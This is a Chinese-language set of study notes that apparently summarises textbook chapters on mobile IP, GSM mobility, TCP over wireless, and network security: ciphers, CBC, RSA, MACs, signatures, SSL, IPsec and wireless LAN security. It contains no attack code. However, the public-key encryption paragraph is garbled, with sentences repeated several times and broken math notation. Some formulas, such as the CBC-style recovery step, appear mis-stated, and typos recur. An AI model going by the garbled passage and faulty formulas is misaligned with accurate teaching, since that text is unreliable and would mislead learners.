现报文还包括了一个移动性代理通告扩展，其中包含了该移动节点所需的附加信息。在这种扩展中又如下一些较重要的字段：</p><ul><li>归属代理比特（H）。指出该代理是它所在网络的一个归属代理。</li><li>外部代理比特（F）。指出该代理是它所在网络的一个外部代理。</li><li>注册要求比特（R）。指出在该网络中的某个移动用户必须向某个外部代理注册。特别是，一个移动用户不能在外部网络中获得一个转交地址，并假定由它自己承担外部代理的功能，无须向外部代理注册。</li><li>M、G封装比特。指出除了IP-in-IP封装形式外，是否还要用其他的封装形式。</li><li>转交地址（COA）字段。由外部代理提供的一个或多个转交地址的列表。移动用户在向其归属代理注册时将选择这些地址中的一个作为其COA。</li></ul><p><code>使用代理请求</code>，一个想知道代理的移动节点不必等待接收代理通告，就能广播一个代理请求报文，该报文只是一个类型值为10的ICMP报文。收到该请求的代理将直接向该移动节点单播一个代理通告，于是该移动节点将继续处理，就好像刚收到一个未经请求的通告一样。</p><p>1.一旦某个移动IP节点收到一个COA，则该地址必须要向归属代理注册。这可通过外部代理或直接通过移动IP节点自己来完成。共涉及4个步骤：</p><p>2.当收到一个外部代理通告后，一个移动节点立即向外部代理发送一个移动IP注册报文。注册报文承载在一个UDP数据报中并通过端口434发送。注册报文携带以下内容：一个由外部代理通告的COA、归属代理的地址（HA）、移动节点的永久地址（MA）、请求的注册寿命和一个64比特的注册标识。请求的注册寿命指示了注册有效的秒数。如果注册没有在规定的时间内在归属代理上更新，则该注册将变得无效。注册标识就像一个序号，用于收到的注册回答与注册请求的匹配。</p><p>3.外部代理收到注册报文并记录节点的永久IP地址。外部代理知道现在它应该查找这样的数据报，即它封装的数据报的目的地址与该移动节点的永久地址相匹配。外部代理然后向归属代理的434端口发送一个移动IP注册报文。这一报文包括COA、HA、MA、封装格式要求、请求的注册寿命以及注册标识。</p><p>4.归属代理接收注册请求并检查真实性和正确性，归属代理把移动节点的永久IP地址与COA绑定在一起。以后，到达该归属代理的数据报与发往移动节点的数据报将被封装并以隧道方式给COA。归属代理发送一个移动IP注册回答，该响应报文中含有HA、MA、实际注册寿命和被认可的请求报文注册标识。</p><p>5.外部代理接收注册响应，然后将其转发给移动节点。</p><p>6.当某个移动节点离开其网络时，外部代理无须显式地取消某个COA的注册。当移动节点移动到一个新网并注册一个新COA时，上述情况将自动发生。</p><h2 id="管理蜂窝网中的移动性"><a href="#管理蜂窝网中的移动性" class="headerlink" title="管理蜂窝网中的移动性"></a>管理蜂窝网中的移动性</h2><p>在GSM术语中，移动用户的归属网络被称作该移动用户的归属公<code>共地域网络（home Public Land Mobile Network, home PLMN）</code>。为简便起见，直接将GSM归属PLMN称为<code>归属网络</code>。移动用户向某个蜂窝网提供商订购了服务，该蜂窝网就称为了这些用户的归属网络。被访问的PLMN直接称为<code>被访网络</code>。归属网络与被访网络的指责有很大的差别。</p><p>归属网络维护一个称作<code>归属位置注册器（Home Location Register, HLR）</code>的数据库，其中包括它每个用户的永久蜂窝电话号码以及用户个人概要信息。重要的是，HLR也包括这些用户当前的位置信息。这就是说，如果一个移动用户当前漫游到另一个提供商的蜂窝网络中，HLR中将包含足够多的信息来获取被访网络中对移动用户的呼叫应该路由选择到的地址。当一个呼叫定位到一个移动用户后，通信者将与归属网络中一个被称作<code>网关移动服务交换中心（Gateway Mobile services Switching Center, GMSC）</code>的特殊交换机联系，用<code>归属MSC</code>简称。</p><p>被访网络维护一个称作<code>访问者位置注册（Visitor Location Register, VLR）</code>的数据库。VLR为每一个当前在其服务网络中的移动用户包含一个表项，VLR表项因此随着移动用户进入和离开网络而出现或消失。VLR通常与移动交换中心在一起，该中心协调到达或离开被访网络的呼叫建立。</p><h3 id="对移动用户呼叫的路由选择"><a href="#对移动用户呼叫的路由选择" class="headerlink" title="对移动用户呼叫的路由选择"></a>对移动用户呼叫的路由选择</h3><pre class="line-numbers language-none"><code class="language-none">呼叫定位到被访网络中的移动GSM用户的步骤：<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>通信者拨打移动用户的电话号码。该号码本身并不设计一个特定的电话线路或位置，号码中的前几位数字足以全局地判别移动用户的归属网络。呼叫从通信者通过公共交换电话网到达移动用户归属网络中的归属MSC。这是呼叫的第一步。</li><li>归属MSC收到该呼叫并查询HLR来确定移动用户的位置。在最简单的情况下，HLR返回移动站点漫游号码（Moblie Station Roaming Number, MSRN），简称漫游号。这个号码与移动用户的永久电话号码不同，后者是与移动用户的归属网络相关联的，而漫游号码是短暂的：当移动用户进入一个被访网络后，会给移动用户临时分配一个漫游号码。漫游号码的作用就相当于移动IP中转交地址的作用。如果HLR不具有该漫游号码，它返回被访网络中的VLR地址。在这种情况下，归属MSC需要查询VLR以便获取移动节点的漫游号码。HLR是如何获得有关移动用户位置信息的？当一个移动电话切换或进入一个由新的VLR所覆盖的被访网络中以后，移动用户必须向被访网络注册，这是通过在移动用户和VLR之间交换信令报文来实现的。被访VLR随后又向移动用户的HLR发送一个位置更新请求报文。这一报文告知HLR可以用来联系移动用户的漫游号码，或者VLR地址。作为这个交换的一部分，VLR同样从HLR那里获取移动用户的信息，以及确定被访网络应该基于移动用户什么样的服务。</li><li>给定一个漫游号码，归属MSC通过网络到达被访网络的MSC建立呼叫的第二步。至此，该呼叫已完成。</li></ul><h3 id="GSM中的切换"><a href="#GSM中的切换" class="headerlink" title="GSM中的切换"></a>GSM中的切换</h3><pre class="line-numbers language-none"><code class="language-none">当一个基站决定切换一个移动用户时所包括的步骤：<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>旧基站（BS）通知被访问MSC即将要进行一个切换，通知移动用户将要切换到的BS（或可能的BS集）。</li><li>被访问MSC发起建立到新BS的路径，分配承载重路由选择的呼叫所需的资源，以及用信令告知新BS一个切换即将出现。</li><li>新BS分配并激活一个无线信道供移动用户使用。</li><li>新BS发出信令返回被访问MSC和旧BS，即已经建立了被访问MSC到新BS的路径并且移动用户应当被告知即将发生的切换。新BS提供移动用户与新的BS相关联所需要的所有信息。</li><li>移动用户被告知它应当进行一个切换。到此时为止，移动用户完全不知道网络已经为切换做好所有底层工作。</li><li>移动用户和新BS交换一个或多个报文，以完全激活新BS中新的信道。</li><li>移动用户向新BS发送一个切换完成报文，该报文随后向上转发给被访问MSC。该被访问MSC然后重路由选择到移动用户的正在进行的呼叫，使其经过新BS。</li><li>沿着到旧BS的路径分配的资源随后被释放</li></ul><h2 id="无限和移动性（对高层协议的影响）"><a href="#无限和移动性（对高层协议的影响）" class="headerlink" title="无限和移动性（对高层协议的影响）"></a>无限和移动性（对高层协议的影响）</h2><p>由于无线信道的高比特差错率和切换丢失的可能性，TCP的拥塞控制反应在无限情况下可能会有问题。有三大类可能的方法用于处理这一问题：</p><ul><li>本地恢复。本地恢复的方法的目标是在比特差错出现的当时和当地将其恢复。</li><li>TCP发送方知晓无线链路。让TCP发送方和接收方知道无线链路的存在，从而将在有线网络中发生的拥塞性丢包和在无线网络中发生的差错/丢包区分开，并且仅对有线网络中的拥塞性丢包采用拥塞控制。</li><li>分离连接方法。在分离连接方法中，移动用户和其他断电之间的端到端连接被打断为两个运输层连接：一个从移动主机到无线接入点，一个从无线接入点到其他通信端点。该端到端连接因此是由一个无线部分和一个有线部分分级连形成的。经无线段的运输层能够是一个标准的TCP连接，或是一个特别定制运行在UDP上的差错恢复协议。</li></ul><h2 id="八、什么是网络安全"><a href="#八、什么是网络安全" class="headerlink" title="八、什么是网络安全"></a>八、什么是网络安全</h2><p>安全通信具有下列所需要的特性：</p><p><code>机密性。</code>仅有发送方和希望的接收方能够理解传输报文的内容。因为窃听者可以截获报文，这必须要求报文在一定程度上进行加密，是截取的报文无法被截获者所理解。</p><p><code>报文完整性。</code>发送方和希望的接收方希望确保其通信的内容在传输过程中未被改变——或者恶意篡改或者意外活动。</p><p><code>端点鉴别。</code>发送方和接收方都应该能证实通信过程所涉及的另一方，以确信通信的另一方确实具有其所生成的身份。</p><p><code>运行安全性。</code>几乎所有的机构几天都有了于公共因特网连接的网络。这些网络因此潜在地能够被危及安全。攻击者能够试图在网络主机中安放蠕虫，获取公司秘密，勘察内部网络配置并发起DoS攻击。</p><h2 id="密码学的原则"><a href="#密码学的原则" class="headerlink" title="密码学的原则"></a>密码学的原则</h2><p>发送者报文的最初形式被称为<code>明文</code>。发送者使用<code>加密算法</code>加密其明文报文，生成的加密报文被称为<code>密文</code>，该密文对任何入侵者看起来是不可懂的。发送方提供了一个<code>密钥</code>KA，它是一串数字或字符，作为加密算法的输入。加密算法以密钥和明文报文m为输入，生成的密文作为输出。用符号KA(m)表示使用密钥KA加密的明文报文m的密文形式。类似地，接收方将为<code>解密算法</code>提供密钥KB，将密文和接收方的密钥作为输入，输出初始明文。也就是说，如果接收方接收到一个加密的报文KA(m)，他可通过计算KB(KA(m)) = m进行解密。在<code>对称密钥系统</code>中，发送方和接收方的密钥是相同并且是秘密的。在<code>公开密钥系统</code>中，使用一对密钥：一个密钥为发送方和接收方两人所知，另一个密钥只有发送方或接收方知道</p><h3 id="对称密钥密码体制"><a href="#对称密钥密码体制" class="headerlink" title="对称密钥密码体制"></a>对称密钥密码体制</h3><p><code>凯撒密码</code>用于英语文本时，将明文报文中的每个字母用字母表中该字母后第k个字母进行替换。</p><p>凯撒密码的一种改进方法是单码代替密码，也是使用自字母表中的一个字母替换该字母表中的另一个字母。然而，并非按照规则的模式进行替换，只要每个字母都有一个唯一的替换字母，任一字母都可用另一字母替换，反之亦然。</p><pre class="line-numbers language-none"><code class="language-none">当考虑入侵者破解加密方案的难易程度时，可以根据入侵者所拥有的信息分为三种不同的情况：<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>1.唯密文攻击。</code>有些情况下，入侵者只能得到截取的密文，也不了解明文报文的内容。</p><p><code>2.已知明文攻击。</code>如果入侵者以某种方式确信在密文报文中会出现的信息，就可以破解部分匹配关系。</p><p><code>3.选择明文攻击。</code>在选择明文攻击中，入侵者能够选择某一明文报文并得到该明文报文对应的密文形式。</p><p><code>4.多码代替密码</code>是对单码代替密码的改进。多码代替密码的基本思想是使用多个单码代替密码，一个单码代替密码用于加密某明文中一个特定位置的字母。因此，在某明文报文中不同位置出现的相同字母可能以不同方式编码。</p><h4 id="块密码"><a href="#块密码" class="headerlink" title="块密码"></a>块密码</h4><p>块密码中，要加密的报文被处理为k比特的块。为了加密一个块，该密码采用了一对一映射，将k比特块的明文映射为k比特块的密文。块密码通常使用函数模拟随机排列表。例如当k = 64时，该函数首先将64比特块划分为8个块，每个块由8比特组成。每个8比特块由一个“8比特到8比特”表处理，这是个可管理的长度。接下来，这8个输出块被重新装配成一个64比特的块。该输出被回馈到64比特的输入，开始了第二次循环。经n此这样的循环后，该函数提供了一个64比特的密文块。</p><h4 id="密码块链接"><a href="#密码块链接" class="headerlink" title="密码块链接"></a>密码块链接</h4><p> 如果使用上述的块密码，会出现一个微妙而重要的问题，即相同铭文块对应的密文块可能是相同的。为了解决这个问题，可以在密文中混合某些随机性，使得相同的明文块产生不同的密文块。令m(i)表示第i个明文块，c(i)表示第i个密文块，并且a⊕b表示两个比特串a和b的异或。将具有密钥S的块密码加密算法表示为KS。其基本思想如下：发送方为第i块生成一个随机的k比特数r(i)，并且计算c(i) = KS(m(i)⊕r(i))。接收方收到c(i)和r(i)，它能够通过计算m(i) = KS(c(i)⊕r(i))而恢复每个明文块。</p><ul><li>引入随机性产生了另一个问题：发送方必须传输一千两倍的比特。为了有效利用该技术，块密码通常使用了一种称为<code>密码块链接（Cipher Block Chaining, CBC）</code>的技术。其基本思想是仅随第一个报文发送一个随机值，然后让发送方和接收方使用计算的编码块代替后继的随机数。集体而言，CBC运行过程如下：</li><li>在加密报文之前，发送方生成一个随机的k比特穿，称为初始向量（Initialization Vector, IV）。将该初始向量表示为c(0)。发送方以明文方式将IV发送给接收方。</li><li>对第一个块，发送方计算m(1)⊕c(0)，即计算第一块明文与IV的异或。然后通过块密码算法运行得到的结果以得到对应的密文块，即c(1) = KS(m(1)⊕c(0))。发送方向接收方发送加密块c(1)。</li><li>对于第i个块，发送方根据c(i) = KS(m(i)⊕c(i – 1))生成第i个密文块。</li></ul><h3 id="公开密钥加密"><a href="#公开密钥加密" class="headerlink" title="公开密钥加密"></a>公开密钥加密</h3><p>在公开密钥密码中，发送方和接收方并未共享一个密钥，而接收方则由两个密钥，一个世界上任何人都可得到的公钥，另一个是只有接收方知道的私钥。使用符号$ K^+_B 和 和和 K^-_B 来分别表示接收方的公钥和私钥。<br>为了与接收方通信，发送方首先取得接收方的公钥，然后用这个公钥和一个众所周知的加密算法，加密他要传递给发送方的报文m；即发送方计算 来分别表示接收方的公钥和私钥。为了与接收方通信，发送方首先取得接收方的公钥，然后用这个公钥和一个众所周知的加密算法，加密他要传递给发送方的报文m；即发送方计算来分别表示接收方的公钥和私钥。为了与接收方通信，发送方首先取得接收方的公钥，然后用这个公钥和一个众所周知的加密算法，加密他要传递给发送方的报文m；即发送方计算 K^+_B (m)。接收方接收到发送方的加密报文后，用其私钥和一个众所周知的解密算法解密发送方的加密报文，即接收方计算 (m)。接收方接收到发送方的加密报文后，用其私钥和一个众所周知的解密算法解密发送方的加密报文，即接收方计算(m)。接收方接收到发送方的加密报文后，用其私钥和一个众所周知的解密算法解密发送方的加密报文，即接收方计算 K^-_B ( (( K^+_B (m))。存在着可以选择公钥和私钥的加密/解密算法和技术，使得 (m))。存在着可以选择公钥和私钥的加密/解密算法和技术，使得(m))。存在着可以选择公钥和私钥的加密/解密算法和技术，使得 K^-_B ( (( K^+_B (m))；也就是说，用接收方的公钥 (m))；也就是说，用接收方的公钥(m))；也就是说，用接收方的公钥 K^+_B 加密报文m，然后再用接收方的私钥解密报文密文形式就能得到最初得到明文m。公钥和私钥加密相互交换同样能够得到结果，即 加密报文m，然后再用接收方的私钥 解密报文密文形式就能得到最初得到明文m。公钥和私钥加密相互交换同样能够得到结果，即加密报文m，然后再用接收方的私钥解密报文密文形式就能得到最初得到明文m。公钥和私钥加密相互交换同样能够得到结果，即 K^-_B ( (( K^+_B $(m)) = $ K^+_B ( (( K^-_B $(m)) = m。</p><h4 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h4><p>RSA算法广泛地使用模n算术运算。RSA由两个互相关联的部分：</p><ul><li>公钥和私钥的选择。</li><li>解密和解密算法。</li></ul><p>为了生成RSA的公钥和私钥，接收方执行如下步骤：</p><ul><li>选择两个大素数p和q。该值越大，破解RSA越困难，而执行加密和解密所用的时间也越长。</li><li>计算n = pq和z = (p – 1)(q – 1)。</li><li>选择小于n的一个数e，且使e和z互素。</li><li>求一个数d，使得ed – 1可以被z整除。即给定e，求d，使得ed mod z = 1。</li><li>接收方使外界可用的公钥 是一对数(n, e)，其私钥是 是一对数(n, d)。</li></ul><p>发送方执行的加密和接收方执行的解密过程如下：</p><ul><li>假设发送方要给接收方发送一个由整数m表示的比特组合，且m &lt; n。为了进行编码，接受当执行指数运算me，然后计算me被n除的整数余数。换言之，发送方的明文m的加密值c就是：c = me mod n。对于这个密文c的比特模式发送给接收方。</li><li>为了对收到的密文报文c解密，接收方计算：m = cd mod n。</li></ul><p>在实际应用中，RSA通常与对称密钥密码结合起来使用。例如，如果发送方要向接收方发送大量的加密数据，他可以用下述方式做。首先，发送方选择一个用于加密数据本身的密钥，这个密钥称为<code>会话密钥</code>，该会话密钥表示为KS。发送方必须把这个会话密钥告知接收方，因为这是他们在对称密钥密码中所使用的共享对称密钥。发送方可以使用接收方的RSA公钥来加密该会话密钥，即计算c = (KS)e mod n。接收方收到了该RSA加密的会话密钥c后，解密得到会话密钥KS。接收方此时已经知道将要用于加密数据传输的会话密钥了</p><h2 id="报文完整性和数字签名"><a href="#报文完整性和数字签名" class="headerlink" title="报文完整性和数字签名"></a>报文完整性和数字签名</h2><p>报文完整性是指，接收方为了鉴别收到的报文，需要证实：</p><ul><li>该报文确实源自希望的发送方。</li><li>该报文在到达的途中没有被篡改。</li></ul><h3 id="密码散列函数"><a href="#密码散列函数" class="headerlink" title="密码散列函数"></a>密码散列函数</h3><p>散列函数以m为输入，并计算得到一个称为散列的固定长度的字符串H(m)。<code>密码散列函数</code>要求具有下列附加的性质：找到任意两个不同的报文x和y使得H(x) = H(y)，在计算上是不可能的。这种性质就意味着入侵者在计算上不可能用其他报文替换由散列函数保护的报文。这就是说，如果(m, H(m))是报文和由发送方生成的报文散列的话，则入侵者不可能伪造另一个报文y的内容，使得该报文具有与原报文相同的散列值</p><h3 id="报文鉴别码"><a href="#报文鉴别码" class="headerlink" title="报文鉴别码"></a>报文鉴别码</h3><p>为了鉴别报文完整性，除了使用密码散列函数外，发送方和接收方需要共享秘密s。这个共享的秘密只不过是一个比特串，它被称为鉴别密钥。使用这个共享秘密，报文完整性能够执行如下：</p><ul><li>发送方生成报文m，用s级联m以生成m + s，并计算散列H(m + s)。H(m + s)被称为报文鉴别码（Message Authentication Code, MAC）。</li><li>然后发送方将MAC附加到报文m上，生成扩展报文(m, H(m + s))，并将报文发送给接受方。</li><li>接收方接收到一个扩展报文(m, h)，由于知道s，计算出报文鉴别码H(m + s)。如果H(m + s) = h，接受方得到结论：一切正常。</li></ul><h3 id="数字签名"><a href="#数字签名" class="headerlink" title="数字签名"></a>数字签名</h3><p>数字签名是一种在数字领域实现的密码技术。</p><p>使用数字签名的发送方的步骤：发送方让他的初始长报文通过一个散列函数。然后他用自己的私钥对得到的散列进行数字签名。明文形式的初始报文连同已经数字签名的报文摘要一道被发送给接收方。</p><p>接收方的步骤：接收方先把发送方的公钥应用于报文获得一个散列结果。然后再把该散列函数应用于明文报文以得到第二个散列结果。若果这两个散列匹配，则接收方可以确信报文的完整性及其发送方。</p><h4 id="公钥认证"><a href="#公钥认证" class="headerlink" title="公钥认证"></a>公钥认证</h4><p>将公钥于特定实体绑定通常是由认证中心（Certification Authority, CA）完成的，CA的职责就是使识别和发行证书合法化。CA具有下列作用：</p><ul><li>CA认证一个实体的真实身份。</li><li>一旦CA验证了某个实体的身份，这个CA会生成一个将其身份和实体的公钥绑定起来的证书。这个证书包含这个公钥和公钥所有者全局唯一的身份标识信息。由CA对这个证书进行数字签名。</li></ul><h2 id="端点鉴别"><a href="#端点鉴别" class="headerlink" title="端点鉴别"></a>端点鉴别</h2><p>1.端点鉴别就是一个实体经过计算机网络向另一个实体证明其身份的过程</p><ol><li>不重数是在一个协议的生存期中只使用一次的数。也就是说，一旦某协议使用了一个不重数，就永远不会再使用那个数字了。</li></ol><p>3.端点鉴别的步骤：</p><ul><li>发送方向接收方发送报文“我是xxx”。</li><li>接收方选择一个不重数R，然后把这个值发给发送方。</li><li>发送方使用他与接收方共享的对称秘密密钥K来加密这个不重数，然后把加密的不重数K®发回给接收方。由于发送方知道K并用它加密一个值，就使得接收方知道收到的报文是由希望的发送方产生的。这个不重数用于确定希望的发送方是活跃的。</li><li>接收方解密收到的报文，如果解密得到的不重数等于他发送给发送方的那个不重数，则可鉴别发送方的身份。</li></ul><h2 id="安全电子邮件"><a href="#安全电子邮件" class="headerlink" title="安全电子邮件"></a>安全电子邮件</h2><h3 id="安全电子邮件-1"><a href="#安全电子邮件-1" class="headerlink" title="安全电子邮件"></a>安全电子邮件</h3><p>如果要设计一个提供机密性、发送方鉴别和报文完整性的电子邮件系统，可以通过把会话密钥和数字签名结合起来实现：发送方首先生成一个预备包，该预备包是通过会话密钥生成的，包括了发送方的初始报文和该报文数字签名过的散列。然后发送方把这个预备包看作一个报文，再经过数字签名后发送给接收方。接收方收到这个包后，通过与发送方相反的步骤获得初始报文。</p><h3 id="PGP"><a href="#PGP" class="headerlink" title="PGP"></a>PGP</h3><p>PGR是安全电子邮件加密方案的一个范例，在公共领域中有各个版本的PGR可以使用</p><h2 id="TCP安全连接-SSL"><a href="#TCP安全连接-SSL" class="headerlink" title="TCP安全连接 SSL"></a>TCP安全连接 SSL</h2><p>TCP的强化版本<code>安全套接字层（Secure Socket Layer, SSL）</code>用安全性服务加强TCP，该安全性服务包括机密性、数据完整性和端点鉴别。SSL版本3的一个稍加修改的版本被称为<code>运输层安全性（Transport Layer Security, TLS）。</code></p><h3 id="宏观描述"><a href="#宏观描述" class="headerlink" title="宏观描述"></a>宏观描述</h3><p>SSL具有三个阶段：握手、密钥导出和数据传输</p><p>一个客户B和一个服务器A之间的通信会话的这三个阶段</p><h4 id="握手"><a href="#握手" class="headerlink" title="握手"></a>握手</h4><p>①与A创建一条TCP连接；</p><p>②验证A是真实的，而不是入侵者假冒的；</p><p>③发送给A一个主密钥，B和A持用该主密钥生成SSL会话所需的所有对称密钥。具体过程：一旦创建了TCP连接，B就向A发送一个hello报文。A用它得到证书进行响应，证书中包含了它的公钥。因为该证书已被某CA证实过，B明白无误地知道该公钥属于A。然后，B产生一个主密钥（EMS），并将该EMS发送给A。A用它的私钥解密该EMS从而得到MS。在这个阶段后，B和A均知道了用于这次SSL会话的主密钥。</p><h4 id="密钥导出"><a href="#密钥导出" class="headerlink" title="密钥导出"></a>密钥导出</h4><p>在密钥导出阶段，MS已由B和A共享，它能够用作所有后继加密和数据完整性检查的对称会话密钥。然而，对于A和B每人而言，使用不同的密码密钥，并且对于加密和完整性检查也使用不同的密钥，通常认为更为安全。因此，A和B都使用MS生成4个密钥：</p><ul><li>EB，用于从B发送到A的数据的会话加密密钥。</li><li>MB，用于从B发送到A的数据的会话MAC密钥。</li><li>EA，用于从A发送到B的数据的会话加密密钥。</li><li>MA，用于从A发送到B的数据的会话MAC密钥。</li></ul><p>这通过直接将MS分为4个密钥来实现。</p><h4 id="数据传输"><a href="#数据传输" class="headerlink" title="数据传输"></a>数据传输</h4><p>在数据传输阶段，SSL将数据流分割成记录，对每个记录附加一个MAC用于完整性检查，然后加密该“记录+MAC”。为了产生这个MAC，B将数据连同密钥MB，一起放入一个散列函数中。B维护一个序号计数器，计数器开始为0，B每发送的一个SSL记录它都增加1。B计算MAC时，他把该序列号包括在MAC的计算中。所以，MAC现在是数据加MAC密钥MB加当前序列号的散列。为了加密“记录+MAC”这个包，B使用他的会话加密密钥EB。然后这个加密的包将传递给TCP经因特网传输。</p><h3 id="完整描述"><a href="#完整描述" class="headerlink" title="完整描述"></a>完整描述</h3><p>前三个字段是不加密的。类型字段指出了该字段是握手报文还是包含应用数据的报文。它也用于关闭SSL连接。在接收端SSL使用长度字段以从到达的TCP字节流中提取SSL记录。</p><h4 id="SSL握手"><a href="#SSL握手" class="headerlink" title="SSL握手"></a>SSL握手</h4><p>详细的SSL握手步骤：</p><ul><li>客户发送它支持的密码算法的列表，连同一个客户的不重数。</li><li>从该列表中，服务器选择一种对称算法、一种公钥算法和一种MAC算法。它把它的选择以及证书和一个服务器不重数返回给客户。</li><li>客户验证该证书，提取服务器的公钥，生成一个前主密钥（Pre-Master Secret, PMS），用服务器的公钥加密该PMS，并将加密的PMS发送给服务器。</li><li>使用相同的密钥导出函数，客户和服务器独立地从PMS和不重数中计算出主密钥（MS）。然后该MS被切片以生成两个密码和两个MAC密钥。此外，当选择的对称密码应用于CBC，则两个初始化向量（IV）也从该MS获得，这两个IV分别用于该连接的两端。自此以后，客户和服务器之间发送的所有报文均被加密和鉴别。</li><li>客户发送所有握手报文的一个MAC。</li><li>服务器发送所有握手报文的一个MAC。</li></ul><h2 id="网络安全性（IPsec和虚拟专用网）"><a href="#网络安全性（IPsec和虚拟专用网）" class="headerlink" title="网络安全性（IPsec和虚拟专用网）"></a>网络安全性（IPsec和虚拟专用网）</h2><p>IP安全（IP Security）协议更常被称为IPsec，它为网络层提供了安全性。IPsec为任意两个网络层实体（包括主机和路由器）之间的IP数据报提供了安全</p><h3 id="IPsec和虚拟专用网"><a href="#IPsec和虚拟专用网" class="headerlink" title="IPsec和虚拟专用网"></a>IPsec和虚拟专用网</h3><p>跨越在多个地理区域上的某机构常常希望有自己的IP网络，使它的主机和服务器能够以一种安全和机密的方式彼此发送数据。为了达到这个目标，该机构能够实际部署一个单独的物理网络，该网络包括路由器、链路和DNS基础设施且与公共因特网完全分析。这样一种为特定的机构专用的分立网络被称为<code>专用网络</code>。专用网络可能耗资巨大，因为该机构需要购买、安装和维护它自己的物理网络基础设施。而使用<code>虚拟专用网（Virtual Private Network, VPN）</code>，机构和办公室之间的流量经公共因特网而不是经物理上独立的网络发送。而为了提供机密性，办公室之间的流量在进入公共因特网之前进行加密。</p><h3 id="AH协议和ESP协议"><a href="#AH协议和ESP协议" class="headerlink" title="AH协议和ESP协议"></a>AH协议和ESP协议</h3><p>在IPsec协议族中，有两个主要协议：鉴别首部（Authentication Header, AH）协议和封装安全性协议（Encapsulation Security Payload, ESP）协议。AH协议提供源鉴别和数据完整性服务，但不提供机密性服务。ESP提供了源鉴别、数据完整性和机密性服务</p><h3 id="安全关联"><a href="#安全关联" class="headerlink" title="安全关联"></a>安全关联</h3><p>IPsec数据报在网络实体对之间发送。在从源实体向目的实体发送IPsec数据报之前，源和目的实体创建了一个网络层的逻辑连接。这个逻辑连接称为<code>安全关联（Security Association, SA）。</code></p><p>在SA内部，路由器将维护有关该SA的状态信息，这包括：</p><ul><li>SA的32比特的标识符，称为安全参数索引（Security Parameter Index, SPI）。</li><li>SA的初始接口和SA的目的接口。</li><li>将使用的加密类型。</li><li>加密密钥。</li><li>整性检查的类型。</li><li>鉴别密钥。</li></ul><p>一个IPsec协议在它的<code>安全关联数据库（Security Association Database, SAD）</code>中存储其所有SA的状态信息，SAD是实体操作系统内核中得到一个数据结构</p><h3 id="IPsec数据报"><a href="#IPsec数据报" class="headerlink" title="IPsec数据报"></a>IPsec数据报</h3><p>IPsec有两种不同的分组形式，一种用于所谓的<code>隧道模式</code>，另一种用于所谓的<code>运输模式</code>。</p><p>将一个IPv4数据报转换成一个IPsec数据报的步骤：</p><ul><li>在初始IPv4数据报后面附上一个“ESP尾部”字段。</li><li>使用算法和由SA规定的密钥加密该结果。</li><li>在这个加密量的前面附加上一个称为“ESP首部”的字段，得到的包称为“enchilada”。</li><li>使用算法和由SA规定的密钥生成一个覆盖整个enchilada的鉴别MAC。</li><li>该MAC附加到enchilada的后面形成载荷。</li><li>最后，生成一个就有经典IPv4首部字段的全新IP首部，该新首部附加到载荷之前。</li></ul><p>IPsec数据报中的新IP首部的源地址和目的地址分别设置为位于隧道两个端点的源和目的地路由器接口。同时，整个新IPv4首部字段中的协议号不被设置为TCP、UDP或SMTP，而是设置为50，指示这是一个使用ESP协议的IPsec数据报。</p><p>ESP尾部由三个字段组成：填充、填充长度和下一个首部。块密码要求被加密的报文必须为块长度的整数倍。使用填充（由无意义的字节组成），使得当其加上初始数据报（连同长度字段和下一个首部字段）形成的“报文”是块的整数倍。填充长度字段指示接收实体插入的填充是多少（并且需要被删除）。下一个首部字段指示包含在载荷数据字段中数据的类型。载荷数据和ESP尾部级联起来并被加密。</p><p>ESP首部以明文发送，它由两个字段组成：SPI字段和序号字段。SPI字段指示接收实体该数据属于哪个SA；接收实体则能够用该SPI索引其SAD以确定适当的鉴别/解密算法和密钥。序号字段用于防御重放攻击。</p><p>发送实体也附加一个鉴别MAC。发送实体跨越整个enchilada计算一个MAC。</p><ul><li>当接收路由器收到IPsec数据报时，首先判断数据报的目的IP地址是否为自己本身。是则进行以下步骤：</li><li>针对enchilada，使用SPI以确定该数据报属于哪个SA。</li><li>计算该enchilada的MAC并且验证该MAC与在ESP MAC字段中<br>的值一致。如果两者一致，它知道该enchilada未被篡改。</li><li>检查序列号字段以验证该数据报是新的（并且不是重放的数据报）。</li><li>使用与SA关联的解密算法和密钥解密该加密单元。</li><li>删除填充并抽取初始的普通IP报文。</li><li>朝着最终目的地将该初始数据报转发进分支机构网络。</li></ul><p><code>安全策略库（Security Policy Database, SPD）</code>。该SPD指示哪些类型的数据报将被IPsec处理；并且对这些将被IPsec处理的数据报应当使用哪个SA。</p><h3 id="IKE-IPsec中的密钥管理"><a href="#IKE-IPsec中的密钥管理" class="headerlink" title="IKE:IPsec中的密钥管理"></a>IKE:IPsec中的密钥管理</h3><p>大型的、地理上分散的部署要求一个自动的机制来生成SA。IPsec使用<code>因特网密钥交换（Internet Key Exchange, IKE）</code>协议来从事这项工作。</p><h2 id="使无限LAN安全"><a href="#使无限LAN安全" class="headerlink" title="使无限LAN安全"></a>使无限LAN安全</h2><h3 id="有限等效保密"><a href="#有限等效保密" class="headerlink" title="有限等效保密"></a>有限等效保密</h3><p>有线等效保密（Wired Qeuivalent Privacy, WEP）协议为在主机和无线接入点之间提供鉴别和数据的加密。鉴别以下列方式进行：</p><ul><li>无线主机通过接入点请求鉴别。</li><li>接入点以一个128字节的不重数响应该鉴别请求。</li><li>无线主机用它与这个接入点共享的密钥加密这个不重数值。</li><li>加入点解密主机加密的不重数值。</li></ul><h3 id="IEEE-802-11i"><a href="#IEEE-802-11i" class="headerlink" title="IEEE 802.11i"></a>IEEE 802.11i</h3><p>802.11i是具有更强安全性机制的802.11的新型、改进版本。802.11i运行分为4个阶段：</p><ul><li>发现。在发现阶段，AP通告它的存在以及它能够向无线客户节点提供的鉴别和加密的形式。客户则请求它希望的特定鉴别和加密形式。</li><li>相互鉴别和主密钥（MK）生成。鉴别发生在无线客户和鉴别服务器之间。在这个阶段，接入点基本是其中继的作用，在客户和鉴别服务器之间转发报文。可扩展鉴别协议（Extensible Authentication Protocol, EAP）定义了客户和鉴别服务器之间交互时的请求/响应模式中使用的端到端报文格式。</li><li>成对主密钥（Pairwise Master Key, PMK）生成。MK是一个仅为客户和鉴别服务器所知的共享密钥，它们都使用MK来生成一个次密钥，即成对主密钥（PMK）。鉴别服务器则向AP发送该PMK。客户和AP现在具有一个共享的密钥，并彼此相互鉴别。</li><li>临时密钥（Tamporal Key, 